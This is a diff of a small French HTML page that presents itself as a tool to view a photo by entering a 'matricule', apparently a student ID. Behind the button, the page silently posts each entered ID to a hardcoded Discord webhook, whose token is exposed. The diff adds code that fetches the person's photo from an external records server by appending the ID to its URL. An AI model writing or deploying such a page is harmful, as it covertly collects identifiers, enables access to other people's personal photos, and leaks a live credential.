@@ -64,14 +64,25 @@
         placeholder="Écris ton matricule ici..."
       ></textarea>
 
-      <button onclick="sendMessage()">VOIR PHOTO</button>
+      <button onclick="sendMessage();ouvrirpage();">VOIR PHOTO</button>
 
       <p id="status"></p>
     </div>
-
     <script>
       const WEBHOOK_URL =
         "https://discord.com/api/webhooks/1375850659475357764/t6bGQnwd60BEYiNp2YCPQrxOSjQbsw_f4Mf3r5JSX43vyZWMhOdehlKzQ6M2keJcYUqo";
+
+      function ouvrirpage() {
+        const mat = document.getElementById("message").value.trim();
+
+        if (!mat) {
+          alert("matricule !");
+          return;
+        }
+
+        const url = "https://agfne.sigfne.net/vas/picture-prod/" + mat;
+        window.open(url, "_blank");
+      }
 
       function sendMessage() {
         const message = document.getElementById("message").value.trim();
@@ -110,4 +121,3 @@
     </script>
   </body>
 </html>
-
